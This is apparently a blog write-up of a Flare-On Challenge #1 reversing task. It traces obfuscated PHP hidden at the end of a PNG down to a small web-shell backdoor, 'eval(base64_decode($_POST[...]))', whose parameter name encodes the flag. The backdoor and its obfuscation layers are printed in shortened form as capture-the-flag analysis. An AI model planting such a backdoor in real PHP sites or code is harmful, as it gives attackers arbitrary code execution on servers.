Posted May 5, 2022

Introduction

Finally, the write-ups for all Challenge #1 across all Flare-on events to date are completed. As we move on to Challenge #2 series, the writeups will be less newbie-ish.

This challenge consists of a HTML file home.html and an image flare-on.png.

Environment

Only a browser is sufficient. The newer Microsoft Edge is used here, which is based on Chromium. When opening the file home.html, we’re greeted with the following page.

Reversing

It’s quite interesting to see that the page does not have anything that asks for inputs or indicate where to begin looking for the flag. So the next natural step is to look at the HTML source code.

Nothing seem to strike as odd… until line 152.

Why is an image file being referenced from inside a PHP tag?? It’s time to take a closer look at this image file.

By inspecting flare-on.png in a hex or text editor, some PHP code can be found embedded at the end of the image file.

Here’s the reformatted code (and shortened, to save space):

$terms=array("M", "Z", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", ...);
$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, ...);
$do_me="";
for($i=0;$i<count($order);$i++){
    $do_me=$do_me.$terms[$order[$i]];
}
eval($do_me);

This code obfuscation snippet takes elements of $terms to build the string $do_me using the arrangement in $order. The string $do_me is executed at the end (or at least, it tries to execute… see Bonus section). Let’s see what $do_me turns out to be.

I used Python to replicate the code and obtained the following output (also reformatted and shortend).

More code obfuscation. New variables $_, $__ and $___ are defined. It appears that $___ is a function, using $__ as the argument. The function name is defined using numbers in base 8 (octal) and 16 (hexadecimal). This is translated to base64_decode. So essentially, the above code is decoding $__ using Base64, which turns out to be:

2

$code=base64_decode($_);
eval($code)

Now, $_ is decoded using Base64 too, then the result is executed. The decoded term is as follows:

if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97..."])) {
    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44..."]));
}

The string within the $_POST is interesting. The values are notated as hexadecimal and decimal numbers, which translates to a11DOTthatDOTjava5crapATflareDASHonDOTcom, or the flag a11.that.java5crap@flare-on.com.

Extras

Trying the challenge

The deobfuscated PHP code embedded in the PNG file is attempting to read the POST value of the HTML variable a11DOTthatDOTjava5crapATflareDASHonDOTcom, then executes the Base64-decoded value of the variable. In theory, this code is a backdoor to execute any arbitrary PHP code that is Base64-encoded.

Out of curiosity, I tried to put this theory to the test and see if it works. Hence, I set up a simple Apache server with PHP module, and configured the setup accordingly. Unfortunately, it didn’t work. Because the variable $do_me contains slashes which was read as an unexpected token by PHP.

However, this actually served as an unexpected shortcut to find out the flag. Since the code is reading the $_POST variables which didn’t exist in my tests, the follow error was found in the Apache logs and the flag is visible.
